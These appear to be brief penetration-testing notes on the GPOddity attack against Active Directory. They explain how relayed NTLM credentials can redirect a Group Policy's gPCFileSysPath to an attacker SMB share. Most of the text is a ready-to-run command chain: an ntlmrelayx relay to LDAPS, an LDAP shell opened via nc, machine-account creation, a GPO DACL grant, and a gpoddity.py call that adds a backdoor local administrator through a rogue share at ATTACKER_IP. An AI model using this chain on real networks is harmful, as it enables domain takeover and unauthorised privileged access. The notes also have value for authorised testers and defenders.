
* GPOddity combines NTLM relaying and modification of Group Policy Container.
*  By relaying credentials of a user who has WriteDACL on GPO, we can modify the path (gPCFileSysPath) of the group policy template (default is SYSVOL).
* This enables loading of a malicious template from a location that we control.

### **Key idea (Why this worked)**

- GPO has an LDAP attribute: **`gPCFileSysPath`**
- This attribute tells clients **where to fetch GPT files**
- Attacker:
    - Changes `gPCFileSysPath` to attacker SMB share
    - Hosts a **malicious GPT**
- Clients blindly fetch GPT from attacker â†’ **code execution**

## **Important Commands**

### NTLM Relay to LDAP

`ntlmrelayx -t ldaps://DC_IP -wh ATTACKER_IP:8080 -i`

### LDAP Shell

`nc 127.0.0.1 11000`

### Create Machine Account

`add_computer GPODDITY password123`

### Give GPO Permissions

`write_gpo_dacl GPODDITY$ {GPO-GUID}`

### Run GPOddity

`python3 gpoddity.py \ --gpo-id GPO-GUID \ --domain corp.com \ --username GPODDITY$ \ --password password123 \ --command "net user evil P@ss /add && net localgroup administrators evil /add" \ --rogue-smbserver-ip ATTACKER_IP \ --rogue-smbserver-share share`


> GPOddity abuses writable GPOs by spoofing the GPT location via LDAP, allowing NTLM-relayed users to achieve domain takeover without passwords.